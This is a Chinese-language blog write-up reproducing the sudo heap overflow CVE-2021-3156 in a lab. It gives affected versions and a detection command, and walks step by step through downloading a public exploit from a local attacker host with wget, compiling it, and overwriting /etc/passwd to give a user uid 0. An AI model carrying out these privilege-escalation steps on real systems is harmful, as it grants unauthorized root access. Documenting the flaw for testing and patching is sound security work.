# CVE-2021-3156-sudo 缓冲区溢出复现 - Saint_Michael - 博客园

> 原文：[`www.cnblogs.com/miruier/p/15733624.html`](https://www.cnblogs.com/miruier/p/15733624.html)

# 一、 漏洞简介

1 月 26 日，Sudo 发布安全通告，修复了一个类 Unix 操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当 sudo 通过 -s 或 -i 命令行选项在 shell 模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用 -s 或 -i 标志运行 sudoedit 时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在 sudoers 文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。目前漏洞细节已公开，请受影响的用户尽快采取措施进行防护。

# 二、影响范围

Sudo 1.8.2 - 1.8.31p2
Sudo 1.9.0 - 1.9.5p1

# 三、检测方法

前提条件：

这个用户必须存在于 /etc/sudoers 文件中，否则执行 sudoedit -s / 会直接说 sudoers 文件中没有这个用户。

非 root 执行

```
sudoedit -s /
```

若返回以“ sudoedit：”开头的错误，则当前系统可能存在安全风险。
![](img/6a9e2c012975d56e2d58d2f27a00579b.png)

不受影响的系统将显示以“ usage：”开头的错误

# 四、漏洞复现

centos7：192.168.110.133

漏洞环境搭建：

```
docker pull manishfoodtechs/xfcefulldesktop_ubuntu20.4
docker run -it manishfoodtechs/xfcefulldesktop_ubuntu20.4 /bin/bash 
```

![](img/784e8da9c32dcea7d9e623822160a41d.png)

sudo 版本

```
sudo --version|head -n 1
```

![](img/d3c1ec980024a820da18038dd23229e5.png)

系统版本

```
lsb_release -a
```

![](img/2dd7dac843ebb4c4e24c9423213083f4.png)

新建 test 测试用户

```
useradd test
passwd test
```

![](img/d5865f62d5d6f82a73da33aeda947616.png)

 切换到 root 用户然后修改下 sudoers 文件权限，然后把 test 用户添加进去

```
chmod u+w /etc/sudoers
vi /etc/sudoers
test    ALL=(ALL:ALL) ALL    #添加这一条到 root 用户下
```

![](img/4dcc0116d46613bb7a4622285b00bbd0.png)

![](img/9659db7fdd4dab1e350ef32f39c539e7.png)

![](img/570a8dd9cfa6ba3846748e4e06bb1db0.png)

执行命令检测看看：

```
sudoedit -s /
```

![](img/eec674fae7b12f9d8c429358acacc243.png)

 因为是用 centos7 拉的 docker 环境，我直接把 exp 下载到 centos7 中

```
git clone https://github.com/stong/CVE-2021-3156.git
python -m SimpleHTTPServer 8081 
```

![](img/7c11b2b2a9515d6d5524cfa05f0f5c29.png)

目标系统：

```
su test
cd /tmp

wget http://192.168.110.133:8081/exploit.c
gcc ./exploit.c
```

![](img/688bb3a13ee8fe0090e59c20850a5d6b.png)

```
cp /etc/passwd kanpasswd
```

![](img/59b6888b86cceb2b39b113e57cdd894b.png)

把 kanpasswd 中的 test 用户 id 和组 id 换为 0
vim kanpasswd

![](img/1de8219b0abcf0d7f978788c4df28503.png)

 替换：

![](img/80897cce64d2af2fa5e587215e7ed87d.png)

```
./a.out /etc/passwd kanpasswd
```

![](img/ec3b3c20dd7efb3f1a7b688e2dac91cd.png)

再重新看 passwd，已经被修改了

```
cat /etc/passwd
```

![](img/e38c42f57c8f89510900a0c00724bc4a.png)

再重新切换至 test，此时 id 显示已提权，有权限看 shadow

```
su test
id
```

![](img/8d26cb4b400af89b422e3c6a34e03beb.png)

# 五、漏洞修复

1、系统更新即可。